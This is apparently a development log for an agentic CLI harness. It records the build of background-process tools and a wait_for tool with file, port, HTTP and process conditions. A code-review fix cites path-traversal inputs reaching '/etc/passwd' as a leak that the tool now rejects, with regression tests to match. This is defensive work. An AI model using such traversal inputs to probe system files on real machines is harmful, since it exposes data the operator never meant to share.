  `bg.process_not_found` (or whatever the sub-error
  shape was). WaitResult-shaped rejections (the
  synthetic `throw r` for matched=false) are skipped
  — those are legitimate "no match" outcomes. all_of
  was already correct because Promise.all rejects on
  first rejection.
- **Recursive bgManager pre-check covers nested
  process_*.** Was: only the top-level kind was
  checked, so `any_of([process_exit, sleep])` without
  bgManager would dispatch sub-waits and let them fail
  with the (now-fixed-above) any_of error path. Now:
  `containsProcessKind` walks the condition tree at
  function entry, throws a clear "composition needs
  manager" error before any dispatch happens. Mirrors
  the tool layer's own `containsProcessCondition` so
  programmatic callers get the same protection. The
  pre-check runs BEFORE the composition handler so
  sub-waits never get spawned with a missing manager.
- 3 regression tests pin the contract:
  any_of with a process_* sub but no manager rejects
  with /bgManager/; nested process_* (2-level deep)
  also rejects; all_of fails fast at function entry
  with clear message.

**Pending (Step 2.2.4):**

- `monitor` — streaming events with LLM-runs-at-end
  semantics. Returns `{ events[], reason }`, separate
  tool surface. Distinct enough to deserve its own
  step.

**Risks documented:**

- **No depth limit in the wait module itself.**
  Programmatic callers (the tool layer or future
  internal use) could construct deeper nesting and
  the wait module would happily recurse. Stack depth
  in JS handles ~1000+ levels comfortably; the model-
  facing limit at the tool layer is the practical
  bound. If a future programmatic caller produces
  pathological depth, a wait-module-level cap can
  land.
- **Multiple sub-waits in parallel multiply poll
  cost.** A composition with N sub-conditions polling
  every 500ms means N concurrent polls. Each poll is
  cheap (fs.existsSync, a TCP connect, etc.) but the
  multiplier is real for large N. `MAX_COMPOSITION_DEPTH`
  bounds the tree, not the breadth — N=20 sub-waits
  in a single any_of is allowed and may stress the
  event loop. Pull-in: if a real workflow needs many
  parallel probes, batch via stride-polling.
- **Sub-wait timeoutMs == outer timeoutMs.** Each
  sub-wait gets the same `timeoutMs` as the outer.
  Their internal timer fires roughly when the outer's
  combinedSignal aborts (both connected). Doesn't
  cause double-counting, but wasted timer
  registrations. Negligible.

---

## [2026-04-29] M3 / Step 2.2.2 — process_exit + process_output

Continues Step 2.2 with the bg-aware wait conditions. After
2.2.1 the `wait_for` tool can sleep, watch files, probe ports,
and poll HTTP — but for the highest-value use case (waiting on
a `bash_background` process to be ready) the model still has to
loop `bash_output` calls, paying LLM cost every step. Spec §7.3.1
calls out the savings: ~$0.40 polling vs ~$0.10 with `wait_for`
on a typical port-ready loop.

**Slice scope (2.2.2):**

| Component | Status | Notes |
|---|---|---|
| `BgManager.getStatus(id)` | NEW | Thin accessor returning `{ status, exitCode, exitedAt } \| null`. Enough for process_exit polling without exposing the full row |
| `WaitOptions.bgManager?` | NEW | Optional injection; process_* conditions fail with clean error when manager is missing |
| Condition `process_exit` | NEW | Poll `getStatus` until `status !== 'running'`. Payload: `{ processId, status, exitCode }`. No log-file reads |
| Condition `process_output` | NEW | Poll `readOutput` with explicit `since*` (transient — doesn't advance model's persisted cursor). Test compiled regex against the new chunk. Local cursors with `PATTERN_OVERLAP=64` avoid missing patterns spanning poll boundaries |
| Tool surface | UPDATED | New kinds in WaitForCondition. `pattern: string` + `is_regex?: boolean` (default false → escape literal). `process_id: string` |
| Tests | NEW | `tests/wait/process.test.ts` with bg manager fixtures (DB + tmp logDir). Tool-level cases extend `tests/tools/wait-for.test.ts` |

**Decisions to make explicit upfront:**

- **Pattern is RegExp internally, string at the tool boundary.**
  JSON has no native regex; the tool accepts `pattern: string`
  and `is_regex?: boolean`. `is_regex: false` (default) escapes
  the input as a literal — matches "READY" exactly, no
  surprise from `.` or `[`. `is_regex: true` compiles the
  string as a regex; if invalid, clean tool error.
- **Process exit during a `process_output` wait is reported
  via payload, not a new conditionMet kind.** Wait returns
  `matched: false` with `payload: { processExited: true,
  exitCode, status }`. Adding 'process_exit' to the
  conditionMet for an OUTPUT wait would conflate two
  different intents. Tools that want exit OR output should
  use `any_of` (lands in 2.2.3).
- **Transient reads via `sinceStdout`/`sinceStderr`.** The
  wait module uses explicit `since*` so the model's
  persisted cursor stays untouched. Same lesson from commit
  `3f8bbda`: explicit since = transient. After a successful
  wait, the model's next `bash_output` call sees the SAME
  bytes (including the matched window) — wait observed,
  didn't consume.
- **Pattern overlap heuristic.** Each poll re-reads the last
  `PATTERN_OVERLAP_BYTES = 64` bytes of the previous read
  alongside the new bytes. Catches patterns up to 64 bytes
  long that straddle a poll boundary. Patterns longer than
  64 bytes risk missing matches; document as risk and pull
  in a configurable overlap if a real workflow surfaces it.
- **`getStatus` instead of exposing `getBgProcess`.** The
  manager already imports the repo for its own internal
  needs; re-exposing the full row would couple wait/ to
  storage row shape. `getStatus` returns only what wait
  needs, lets storage shape evolve independently.

**Out of scope for 2.2.2 (deferred to 2.2.3):**

- `monitor` (streaming events, LLM runs at the end).
- `all_of` / `any_of` composition (recursive resolution,
  spec acknowledges race surface in `any_of`).

**Spec reference:** `AGENTIC_CLI.md §7.3.1`,
`src/bg/manager.ts` (readOutput + status accessor).

**Done:**

- `BgManager.getStatus(id)` — thin accessor returning
  `StatusSnapshot { status, exitCode, exitedAt } | null`.
  Cross-session ids return null (defense-in-depth, same
  pattern as readOutput / kill).
- `WaitOptions.bgManager?: BgManager` injection point. Only
  required for process_* conditions. Other conditions
  ignore the field.
- Condition `process_exit` — polls `getStatus` until
  status leaves 'running'. Payload reports
  `{ processId, status, exitCode, exitedAt }`. Cheap (no
  log file IO). Already-exited processes match on first
  poll (verified < 200ms in test).
- Condition `process_output` — polls
  `manager.readOutput` with explicit `sinceStdout`/
  `sinceStderr` so the read is transient (lesson from
  commit `3f8bbda`). Local cursors track wait progress
  independently from the model's persisted cursor; a
  successful wait does NOT consume bytes — a subsequent
  canonical bash_output sees the SAME content (test
  pins this contract). Pattern is regex (compiled at
  the tool layer); first match returns
  `{ processId, stream: 'stdout' | 'stderr', match }`.
  When the process exits without matching, returns
  `matched: false` with payload
  `{ processExited: true, status, exitCode }` so the
  model can distinguish "running but no marker yet
  (timeout)" from "service crashed before saying ready
  (process exited)".
- `PATTERN_OVERLAP_BYTES = 64` — each poll re-reads the
  last 64 bytes of the previous read alongside the new
  bytes, catching patterns that straddle a poll
  boundary. Test pins this with `printf 'BLT-'; sleep
  0.1; printf 'TOKEN-37'` + pattern `/BLT-TOKEN-37/`.
- Tool surface adds `process_exit` and `process_output`
  kinds to `WaitForCondition`. Schema fields:
  `process_id` (required), `pattern: string` (literal
  by default), `is_regex?: boolean` (default false →
  literal escape via `escapeRegexLiteral`). The global
  flag (`g`) is rejected because RegExp.exec with /g
  carries lastIndex state across calls and breaks the
  per-poll re-read pattern.
- Tool error mapping:
  - missing bgManager → `bg.manager_unavailable` (same
    code as bash_output / bash_kill — uniform operator
    surface)
  - unknown / cross-session process_id →
    `bg.process_not_found` (same code as bash_output /
    bash_kill)
  - invalid regex when `is_regex: true` →
    `tool.invalid_arg` with the underlying message
  - empty process_id / empty pattern → `tool.invalid_arg`
- 14 unit tests in `tests/wait/process.test.ts`: literal
  match in stdout, regex match in stderr, observational
  contract (cursors stay at 0), timeout, processExited
  payload on exit-without-match, pattern overlap across
  polls, unknown id, missing bgManager. process_exit
  covers natural exit, non-zero code, immediate match
  on already-exited, timeout on never-exiting.
- 10 tool tests in `tests/tools/wait-for.test.ts`:
  process_exit reports exit code; process_output
  literal escapes regex meta (`1.0` doesn't match
  `100`); is_regex=true compiles regex; invalid regex
  rejected; bg.process_not_found / bg.manager_unavailable
  surfaces.
- Total: 762 pass / 7 skip / 0 fail. Typecheck + lint
  green.

**Decisions taken (not in opener):**

- **Tool error codes mirror bash_output/bash_kill.** When
  bgManager is missing or process_id is unknown, the
  operator-facing surface is the same as the existing bg
  tools — `bg.manager_unavailable` and `bg.process_not_found`.
  Avoids one-off wait-prefixed codes that would force the
  operator to learn duplicate vocabulary.
- **process_output's exit detection is reactive, not
  predictive.** We don't subscribe to the natural-exit
  promise; we poll readOutput and check `r.status`. The
  `live` map in the manager isn't part of the public
  surface, and exposing it would couple wait/ deeper than
  needed. The polling cost is bounded (one extra DB read
  per cycle) and the observability is the same.
- **Local cursors live entirely in the wait module.** No
  storage state. If the wait is aborted mid-flight, the
  cursors are simply discarded — nothing to clean up.
  Future `monitor` (2.2.3) may want persistent state for
  cross-session resumption, but that's a separate
  concern.
- **The /g rejection happens after construction, not
  before.** `new RegExp(pattern)` from a string can't
  carry the global flag (no inline `/g` flag in JS regex
  syntax, and the second arg isn't accepted from our
  schema). The `regex.global` check is defensive against
  future construction paths that might.

**Pending (Step 2.2.3):**

- `monitor` (streaming events, LLM runs at the end after
  max_events / duration / cancellation).
- `all_of` / `any_of` composition (recursive resolution,
  spec acknowledges race surface in `any_of`).

**Code review fixes applied before commit:**

- **`process_output` drains pending bytes after exit.**
  Was: a process emitting >64KB (default `readOutput`
  maxBytes) and exiting in the same poll window would
  have only the first chunk scanned. `r.status='exited'`
  + `r.stdoutPending > 0` triggered an immediate
  processExited report, silently skipping the tail
  where the pattern might live. Now: on detecting exit,
  the loop drains until both stream pendings are 0,
  testing each chunk. Defensive break on cursor-not-
  advancing prevents infinite loops if a future
  readOutput regression returns end < cursor.
  Regression test: 70KB filler + EXIT-MARKER-DRAIN +
  exit; before the fix, the marker was reported as
  processExited.
- **`getStatus` throws on cross-session ids.** Was:
  returned null, conflating "id doesn't exist anywhere"
  with "id belongs to another session" — both
  surfaced as `bg.process_not_found`, hiding the real
  diagnosis. Now: throws same shape as readOutput /
  kill (`bg process not in this session: ${id}`).
  process_exit's case in waitFor catches and re-
  throws, preserving the existing tool surface.
- **Removed dead `/g flag rejection` test.** Was: a
  test whose body was `expect(typeof ctx).toBe('object')`
  with a comment admitting the flag is unreachable
  via string-only schema. The `regex.global` check in
  the tool stays as defensive code, the test was
  noise.
- **Added empty-pattern rejection test.** Mirrors the
  existing "rejects empty process_id" — pattern
  validation was already in `buildCondition`, just
  uncovered.

**Risks documented:**

- **Patterns longer than `PATTERN_OVERLAP_BYTES = 64` may
  miss matches that straddle a poll boundary.** A 100-byte
  pattern split 70/30 across two polls would have only the
  last 64 of the first poll re-read, the leading 6 bytes
  of the pattern would be lost. Mitigation today:
  documented; configurable overlap can land if a real
  workflow surfaces longer patterns. Most "ready marker"
  patterns are <30 bytes — we're not close to the limit.
- **`process_output` matches on regex.exec, which is
  greedy.** A pattern like `/STARTED|FINISHED/` hits the
  first occurrence; if both substrings appear in the same
  poll's chunk, we only see the leftmost. Most ready-marker
  use cases are first-occurrence anyway, so this is the
  desired behavior. Multi-event observation belongs in
  `monitor` (2.2.3), not wait_for.
- **Race: process exits between getStatus poll and
  readOutput poll in process_output.** Status check happens
  AFTER readOutput; if the process exited mid-poll, we'd
  read the final bytes, fail to match, then notice
  `r.status !== 'running'` and report processExited. The
  final bytes ARE in the chunk we tested, so no real
  loss. Documented for completeness — observed-zero-impact.
- **Inherited from 2.2.1:** mtime granularity, port_open
  listen() init false-negative, HEAD unsupported on
  legacy servers.

---

## [2026-04-29] M3 / Step 2.2.1 — wait_for + non-bg conditions

Opens Step 2.2 (`wait_for` / `monitor` primitives, spec
§7.3.1) with the cheap-conditions slice: a wait_for tool
that supports `sleep`, `file_exists`, `file_change`,
`port_open`, and `http_response`. None of these depend on
the bg manager — they're standalone utility waits that any
synchronous workflow can use today.

**Why this slice first:**

- Spec §7.3.1 calls out the cost difference: 4-5 polling
  steps via repeated `bash_output` ≈ $0.40 in LLM calls
  vs `wait_for` ≈ $0.10. Even without process-aware
  conditions, the model gains `sleep` (no more "ask the
  user to wait" steps), `file_exists` (wait for a build
  artifact), `port_open` (wait for a server to be ready),
  and `http_response` (probe an endpoint). All immediately
  useful.
- Process-aware conditions (`process_exit`,
  `process_output`) need the bg manager's stream
  subscription surface — that's a different category of
  work (file watching with regex against a growing log).
  Splitting them out as 2.2.2 keeps each step's surface
  auditable.
- `monitor` and composition (`all_of`, `any_of`) are
  another distinct category — streaming events and
  recursive condition resolution. 2.2.3.

**Slice scope (2.2.1):**

| Component | Status | Notes |
|---|---|---|
| `src/wait/` module | NEW | `waitFor(condition, opts)` primitive + per-kind condition implementations |
| Condition `sleep` | NEW | `setTimeout` raced against signal-abort |
| Condition `file_exists` | NEW | poll `fs.existsSync` at `pollIntervalMs` (default 500ms); resolve immediately if already present |
| Condition `file_change` | NEW | snapshot mtime on first poll, compare on subsequent. mtime-based — granularity bounded by FS (1s on some) |
| Condition `port_open` | NEW | `net.connect` probe; success closes the connection, failure retries until timeout |
| Condition `http_response` | NEW | `fetch` HEAD/GET; optional `status?` match (else any 2xx) |
| Tool `wait_for` | NEW | category=`misc` (no command/path decision), planSafe (read-only) |
| Tests | NEW | Per-condition unit tests + tool-level integration tests. port_open + http_response use `Bun.serve` on ephemeral ports for deterministic fixtures |
| BACKLOG, bootstrap test | NEW | Tool count 9 → 10 |

**Out of scope for 2.2.1 (deferred):**

- **`process_exit` / `process_output` (2.2.2).** Need
  bg manager subscription. process_exit is cheap
  (already have `live` map with exitedSettled
  promises). process_output requires growing-log
  watch + regex matching with cursor — more involved.
- **`monitor` (2.2.3).** Streaming observation. Spec
  §7.3.1 makes it distinct from `wait_for` because
  the LLM runs at the END (after max_events / duration /
  cancellation), not on first match.
- **Composition (`all_of` / `any_of`, 2.2.3).**
  Recursive WaitCondition resolution. Spec acknowledges
  race-condition surface in `any_of`. Deferred so the
  base conditions are stable before the combinator
  layer lands on top.

**Decisions to make explicit upfront:**

- **Polling, not native filesystem watches.** `fs.watch`
  is platform-specific (inotify / FSEvents / Windows API)
  with subtle correctness gotchas (events drop on rename,
  some FSes don't fire). Spec §7.3.1 describes
  `chokidar / fs.watch` — both are watcher libraries with
  fallback layers we'd need to vendor. Going with mtime
  polling for v1: portable, simple, and the latency
  difference (≤ pollIntervalMs) is acceptable for the
  build-artifact / server-ready use cases.
- **`http_response` uses HEAD by default.** Avoids
  downloading a response body just to check status.
  When user wants body content (future enhancement),
  that's a different condition kind.
- **`port_open` opens then closes the probe connection
  immediately.** No data sent. Tests against a TCP
  service that doesn't accept connections (e.g. the
  socket exists but server is mid-init) will fail-fast
  on RST, which is the right signal.
- **No `process_*` conditions in this slice.** Even
  though the bg subsystem just landed, mixing it into
  2.2.1 would force the wait module to depend on bg
  internals before its own surface is stable.
- **Relative paths resolve against `ctx.cwd`, not
  `process.cwd()`.** Lesson carried over from the
  bash_background cwd review (commit `509f964`):
  `args.cwd` defaulting via `process.cwd()` silently
  runs in the wrong directory whenever the harness
  was launched with a different working dir than the
  session (evals, bootstrap-from-script, worktree
  subagents). Apply the same pattern to `file_exists`
  and `file_change` conditions when they accept a
  `path` arg — undefined unsupported (path is
  required), absolute used as-is, relative resolved
  via `resolve(ctx.cwd, path)`. Pin with regression
  tests that set `ctx.cwd` to a tmp dir distinct from
  the harness's process dir and assert the condition
  fires against the SESSION path, not the harness path.

**Spec reference:** `AGENTIC_CLI.md §7.3.1`,
`CONTEXT_TUNING.md §3` (cost rationale).

**Done:**

- New `src/wait/` module exporting `waitFor(condition, opts)`
  primitive plus the discriminated `WaitCondition` union for 5
  kinds. Internal poll loop dispatches per-kind; abort and
  timeout fold into a single `combinedSignal` via
  `buildTimeoutSignal()` so the polling code only watches one
  signal source. Cleanup function clears the timer on every
  exit path.
- Five conditions implemented:
  - `sleep` — `setTimeout` raced against caller signal. Edge
    case: when `durationMs > timeoutMs`, the wait reports
    `conditionMet: 'timeout'` rather than masquerading as a
    successful sleep.
  - `file_exists` — poll `fs.existsSync` at `pollIntervalMs`
    (default 500ms). Resolves immediately if the file is
    already present.
  - `file_change` — snapshot `mtimeMs` on first poll, compare
    on subsequent. Treats "missing → present" as a change so
    the model can wait for a build artifact to appear OR be
    refreshed. Payload reports both `mtimeMs` and
    `previousMtimeMs` (null when the file was missing
    initially).
  - `port_open` — `net.connect` probe with per-attempt
    timeout = `pollIntervalMs`. On failure, sleeps
    `min(pollIntervalMs, 100ms)` before retrying — fast-failing
    sockets don't need the full poll interval.
  - `http_response` — `fetch` HEAD with optional `status?`
    match (defaults to any 2xx). Caller signal threads through
    `fetch`'s own signal so a wait-level abort interrupts a
    slow server mid-request, not just between polls.
- `wait_for` tool (`src/tools/builtin/wait-for.ts`):
  - `category: 'misc'` + `planSafe: true` (pure observational
    primitive — no command, no path mutation; HEAD probes,
    file stats, TCP connect+close are all read-only).
  - Snake-case condition fields in the schema
    (`duration_ms`, `poll_interval_ms`, etc.) consistent with
    every other Forja tool surface.
  - Path resolution against `ctx.cwd` for `file_exists` /
    `file_change`. Lesson from commit `509f964`: relative paths
    must land in the session dir, not `process.cwd()`.
    Validation rejects unknown kinds and bad arg shapes with
    clean tool errors instead of letting `waitFor` throw.
- Tool count: 9 → 10. Bootstrap test updated.
- 17 unit tests in `tests/wait/wait-for.test.ts` cover every
  kind's match path, timeout path, and abort path. `port_open`
  uses `Bun.listen` on an ephemeral port; `http_response`
  uses `Bun.serve` with `/ok` (200) and `/teapot` (418)
  routes — no flaky external calls.
- 11 tool tests in `tests/tools/wait-for.test.ts`:
  happy paths (sleep / file_exists abs / file_exists relative
  resolves against ctx.cwd / file_change payload), timeout
  reporting, signal propagation (mid-wait abort + pre-aborted
  ctx returns clean tool error), input validation (unknown
  kind, missing required field, negative timeout, port out of
  range).
- Total: 732 pass / 7 skip / 0 fail. Typecheck + lint green.

**Decisions taken (not in opener):**

- **Rejected per-condition file modules.** Opener had me
  considering `src/wait/conditions/sleep.ts`, `port-open.ts`,
  etc. Single-file `src/wait/index.ts` is ~270 LOC and reads
  end-to-end in one screen — splitting would have added
  coordination cost (cross-file shared types like
  `WaitConditionMet`) without enabling parallel work. Revisit
  when 2.2.2 / 2.2.3 land more conditions.
- **`combinedSignal` pattern.** Internal helper
  `buildTimeoutSignal(timeoutMs, callerSignal)` returns a
  single signal that fires on EITHER the caller abort OR the
  internal timeout. The polling loop only checks one signal
  source; the `timeoutFired()` accessor lets the caller
  distinguish timeout-from-abort when reporting the result.
  Cleaner than tracking two signals across every await.
- **`http_response` defaults to "any 2xx".** Spec doesn't pin
  the default. 2xx is the common "service ready" semantic;
  models that want a specific code (418 for a teapot probe)
  pass `status` explicitly. A 4xx/5xx return without explicit
  `status` does NOT match — it's still a network success but
  the service isn't ready.
- **`mtime null → present` IS a change.** Strictly speaking
  "mtime change" implies the file existed at baseline. But
  the practical use case ("wait for the build artifact to
  appear or update") wants both shapes. Documented in JSDoc;
  payload's `previousMtimeMs: null` lets the caller
  distinguish creation from modification.
- **`port_open` per-attempt timeout = `pollIntervalMs`.**
  Without a per-attempt cap, a slow DNS lookup or
  unreachable host could hang each probe far longer than the
  poll interval. Capping at the poll interval keeps the loop
  responsive to the outer timeout.

**Pending (Step 2.2.2 / 2.2.3):**

- 2.2.2: `process_exit`, `process_output` (depend on bg
  manager subscription).
- 2.2.3: `monitor` (streaming events), `all_of` / `any_of`
  composition.

**Risks documented:**

- **mtime polling has 1-second granularity on some FS.**
  ext4 and APFS have sub-second mtimes; FAT and some NFS
  setups round to 1s. A back-to-back `writeFileSync` could
  land within the same mtime tick on those filesystems and
  the change goes undetected. Mitigation today: documented;
  the test `'matches when an existing file is modified'`
  uses a 200ms gap which exceeds the worst-case granularity.
  Pull-in signal: if a real workflow on a low-resolution FS
  flakes, switch to content-hash comparison or `fs.watch`
  (with all the platform fragility that entails).
- **`port_open` reports false negative on slow listen()
  socket initialization.** A server that calls `listen()` but
  hasn't fully bound yet may return RST instead of accepting
  — `tryConnect` reports false, the wait keeps polling. By
  next poll the bind has completed. Behavioral parity with
  any other "wait for server ready" pattern; spec
  acknowledges this in the §7.3.1 example.
- **`http_response` HEAD may be unsupported by some
  servers.** A few legacy services return 405 on HEAD. The
  current default (any 2xx) would never match. Pull-in
  signal: when a real workflow needs GET-style probing,
  add `method: 'GET' | 'HEAD'` to the condition.

**Code review fixes applied before commit:**

- **Reject `..` in path segments (file_exists / file_change).**
  The first draft resolved relative paths against `ctx.cwd` but
  did nothing to prevent `../../etc/passwd`-style traversal —
  `resolve()` happily collapses `..` and the model gets a
  boolean of existence + mtime for any path on the system.
  Cosmetic protection (model can pass `/etc/passwd` directly
  if absolute paths are allowed at all), but the cheap
  loader-style check closes the obvious leak vector. Rejects
  `..` segments in BOTH relative and absolute paths
  (`/foo/../etc/passwd` rejected too, since `..` in the
  middle obscures the actual target). 3 regression tests
  pin the contract: relative traversal rejected, absolute
  traversal rejected, filename containing literal `..`
  (e.g. `foo..txt`) accepted.
- **`tryConnect` honors caller signal.** Was: per-attempt
  hang up to the connect-timeout after caller abort, with
  the outer poll loop catching it on the next iteration.
  Now: `combinedSignal` is threaded into `tryConnect`; on
  abort, the socket is destroyed and the probe settles
  immediately. Regression test fires abort 50ms into a
  probe of a non-routable host and asserts the wait
  returns in <500ms (vs ~1.2s without the cascade).
- **`port_open` per-attempt timeout has a 200ms floor.**
  Was: connect timeout = `pollIntervalMs`, which at very
  low poll values (10ms) rejected legit DNS/handshake
  before they could complete. Now: `Math.max(pollIntervalMs,
  200)` for the connect attempt. The combined signal still
  cuts the attempt short on user timeout, so the floor
  doesn't hold the loop past the user-supplied cap.
- **`http_response` exposes `redirect` option.** Was:
  fetch followed 3xx silently, so a 301→200 chain
  matched as 200 and the model couldn't distinguish "the
  endpoint redirected" from "the endpoint responded".
  Now: `redirect?: 'follow' | 'manual'` on the condition.
  Default 'follow' preserves the prior behavior; 'manual'
  surfaces the literal status. 2 regression tests pin
  both modes (follow returns 200 from /redirect, manual
  returns 301).

**Code review follow-ups (not blocking, deferred):**

- **`file_change` accepts directories silently.** Spec says
  "file"; we don't reject. Could be feature or bug. Fix or
  document when a real workflow surfaces the ambiguity.
- **No path policy gate on `wait_for`** — operators can't
  deny `tools.wait_for.allow_paths: ['build/**']`. Same
  asymmetry exists for `port_open` / `http_response` (no
  network policy). Real fix: per-condition category routing
  (`fs.read` for file_*, future `net.probe` for network
  conditions) — needs engine support, scope of 2.2.3 or
  later.

---

## [2026-04-28] M3 / Step 2.1 — bash_background trio + storage

Opens M3 / Step 2 with the smallest cohesive slice of the
background-process subsystem: the three execution tools
(`bash_background`, `bash_output`, `bash_kill`) plus the
storage table that persists process state across turns.

**Why this subsystem next, why this slice first:**

- `bash_background` extends an existing tool (`bash`) rather
  than introducing a new architectural layer (subagents,
  MCP, slash commands). Lowest blast radius for a first
  M3-after-eval-regression step.
- It unblocks real workflows the M2 tool surface can't
  reach: long-running dev servers, file watchers, builds
  with progress output. Today the only options are
  "block bash for 30s and pray" or "give up on long
  commands."
- Wait/Monitor primitives (`§7.3.1`) are valuable but
  much bigger — file watching, port probing, HTTP
  polling, condition composition. They depend on
  `bash_background`'s process_id surface for half their
  conditions (`process_output`, `process_exit`).
  Splitting them out as Step 2.2 keeps each step's
  surface auditable.

**Plan (stepwise):**

- 2.1 — Storage migration + repo + process manager + 3
  tools + session-end cleanup + unit tests + 1
  regression case. **This entry.**
- 2.2 — `wait_for` and `monitor` primitives (the cheap
  conditions first: `sleep`, `file_exists`, `file_change`,
  `port_open`; then process-aware conditions on top of
  2.1's manager).
- 2.3 — `http_response` wait condition + composition
  (`all_of` / `any_of`).

**Slice scope (Step 2.1):**

| Component | Status | Notes |
|---|---|---|
| Migration `005-background-processes` | NEW | Table per spec §13 model. Indices on (session_id, status) |
| `bgProcessRepo` | NEW | Typed CRUD; `cleanup(sessionId)` marks running rows killed |
| Process manager | NEW | `src/bg/manager.ts`. Wraps `Bun.spawn`, log files in `.agent/bg/<id>.{stdout,stderr}.log`, exit-event → DB update, kill = SIGTERM → 5s grace → SIGKILL |
| Tool `bash_background` | NEW | category=`bash`, writes=true. Returns `{ process_id, label, spawned_at }` |
| Tool `bash_output` | NEW | category=`bash` (read-side; pessimistic), idempotent for fixed cursor. Cap N KB per call |
| Tool `bash_kill` | NEW | category=`bash`. Idempotent on already-exited |
| Session-end cleanup | NEW | Wired into harness exit path; best-effort via `process.on('exit')` |
| Unit tests | NEW | Manager (spawn/output/kill/exit), repo (CRUD/cleanup), 3 tools (perm denial, error paths) |
| Regression case | NEW | `36-bash-background-flow.yaml` — spawn sleep+echo, poll output, kill. Explicit multi-step prompt |

**Out of scope for 2.1 (deferred with rationale):**

- **`wait_for` / `monitor` (§7.3.1).** Step 2.2. Without
  these, the model has to poll via repeated
  `bash_output` calls — costs more LLM steps but works.
  Spec acknowledges the cost difference (`~$0.40` vs
  `~$0.10` for a port-ready loop). 2.1 ships the
  baseline; 2.2 adds the optimization. Cleaner than
  shipping a half-implemented wait/monitor surface.
- **`<BackgroundProcessTray>` UI.** No interactive UI
  yet. Tray waits for Ink work in the broader M3/M4
  scope. Status visible today via `bash_output` (the
  model's view) and the `background_processes` DB
  table (the audit log view).
- **`/bg cleanup` slash command.** Slash commands not
  implemented yet. Session-end cleanup covers the
  primary case (no zombies after a session ends);
  inter-session cleanup (orphaned rows from a crashed
  prior session) waits for slash command surface.
- **`maxOutputSize` per-process budget.** Spec doesn't
  pin this. We'll use a sane per-call cap on
  `bash_output` (e.g., 64 KB) but no total-output
  ceiling per process — operator manages disk via
  `bash_kill` if needed.

**Decisions to make explicit upfront:**

- **OS pid vs internal id.** The tool returns an
  internal `process_id` (UUID-class string), not the
  OS pid. Operator-facing diagnosis can pull the OS
  pid from the DB if needed; the public surface
  doesn't depend on OS-level identifiers (lets us
  swap process strategy later — daemon, remote, etc.
  — without breaking the tool contract). Spec §7.3 is
  intentionally vague on which one `process_id`
  refers to; we pin internal-id here.
- **Permission engine treatment.** All three tools
  fall under category=`bash`. The bash policy
  (`allow`/`deny`/`confirm`) gates the SPAWN COMMAND
  on `bash_background`. `bash_output` and `bash_kill`
  reference an existing process_id; we don't re-check
  the original command's policy on those calls (the
  decision was already made when spawning). If
  policy changes mid-session and a previously-allowed
  command's output is still being read, that's not a
  regression — the spawn was approved; reading
  stdout from an already-spawned process doesn't open
  new attack surface.
- **Log file path is in `.agent/bg/`.** Same prefix as
  the SQLite DB. Auto-created on first spawn.
  Cleanup: rotate by session_id at session start (or
  delete on `cleanup` call). 2.1 keeps the simplest
  policy: create on spawn, leave on disk after kill,
  cleanup happens via session-end manager pass.
- **No prompt-cache concern.** bg processes are local;
  no provider call involved. The harness loop's
  prompt-cache logic is independent.

**Spec reference:** `AGENTIC_CLI.md §7.3` (background
processes), `§13` (data model — `background_processes`),
`CONTRACTS §2.6` (tool contract). `§7.3.1` is the next
slice.

**Risks documented:**

- **Zombie processes on hard crash.** `process.on('exit')`
  is best-effort — `kill -9` to the harness leaves bg
  processes orphaned. Mitigation: store `os_pid` in
  DB so a future `agent doctor` (M4 spec §18) can
  detect and kill. Today: documented gap. Operators
  who run with autonomous agents over flaky
  connections should expect to occasionally clean up
  manually with `pkill -P <harness-pid>` or similar.
- **Log file disk usage / no gc.** Spec §7.3 says
  "Limpo no fim da sessão (ou via /bg cleanup)" —
  ambiguous between cleaning the PROCESSES (we do)
  and the log FILES (we don't). Decision: keep log
  files after session end so operators can do
  post-mortem inspection (a `npm run dev` that
  crashed yesterday is exactly the kind of thing
  someone wants to read tomorrow). Trade: `.agent/bg/`
  accumulates ~2 files per spawn forever. Pull-in
  signals to add gc:
    - `agent doctor` lands (M4) — natural place to
      run `forja bg gc --older-than=7d`.
    - Slash commands land — `/bg cleanup` per spec.
    - A real workflow saturates disk before either —
      add `max_log_bytes` or age-based prune as
      hotfix.
  The `npm run dev` + verbose-output worst-case is
  ~100 MB/hour. Single session is bounded; cross-
  session accumulation is the only concern, and
  that's a non-issue until someone hits it.
- **Multi-process race in DB updates.** Process
  exit events fire on Node's event loop; if two bg
  processes exit nanoseconds apart and both update
  the DB, SQLite's serialization handles it (we're
  WAL mode). Documented for completeness — no
  observed issue, but worth noting.
- **Operator can't deny output reads from already-
  spawned process.** `bash_output` and `bash_kill`
  are category=`misc` (auto-allowed). The defense
  in depth is at spawn time — if a spawn passes
  policy, reading its output and killing it are
  treated as already-approved operations. This is
  intentional (see code comments in those tools)
  but means a policy change mid-session won't
  retroactively gate output reads. Pull-in signal:
  if an operator workflow specifically wants
  policy-gated output reads, add a category
  `bg.read`/`bg.kill` and a corresponding
  `tools.bash_output` / `tools.bash_kill` policy
  section. Not blocking today.

**Done:**

- Migration 005 (`background_processes`) with 13 columns,
  2 indices, FK on session_id with cascade, CHECK on
  status enum (`running|exited|killed|failed`).
- Repo `bg-processes.ts` exposing
  `insertBgProcess` / `getBgProcess` / `listBgProcessesBySession`
  (with single+array status filter) /
  `advanceBgProcessCursor` (hot-path single UPDATE) /
  `finalizeBgProcess` (status='exited|killed|failed') /
  `markRunningAsKilled` (bulk session-level converge).
- Process manager `src/bg/manager.ts` factory
  `createBgManager({ db, sessionId, logDir })` exposing:
  - `spawn(input)` — `Bun.spawn` with stdout/stderr piped
    direct to `<id>.{stdout,stderr}.log` files, subscribes
    to `proc.exited` for natural-exit DB updates
  - `readOutput(id, { since?, maxBytes? })` — byte-cursor
    window read with UTF-8 replace decoding (binary-safe),
    advances persisted cursor on success, reports
    `stdoutPending` / `stderrPending` for truncation
  - `kill(id, { signal?, gracePeriodMs? })` — SIGTERM →
    grace via `Promise.race` → SIGKILL escalation,
    idempotent on already-finished processes
  - `cleanup()` — parallel kill of every still-running
    process for the session, plus `markRunningAsKilled`
    DB convergence for any kill that threw
- Three tools registered in builtin tool set
  (`bash_background`, `bash_output`, `bash_kill`),
  all under category `bash` so existing bash policy
  rules apply uniformly. Tool count: 6 → 9.
- `HarnessConfig.bgLogDir?: string` triggers
  session-scoped manager creation inside the loop
  (after `createSession`). Wired through
  `ToolContext.bgManager` so the three tools dispatch
  via closure-captured manager.
- Outer try/finally in `runAgent` calls
  `bgManager.cleanup()` on EVERY exit path: natural
  done, budget exhaustion, abort, internalError.
  Cleanup is best-effort — any thrown error is
  swallowed so the run's `HarnessResult` stays clean,
  and DB convergence via `markRunningAsKilled` ensures
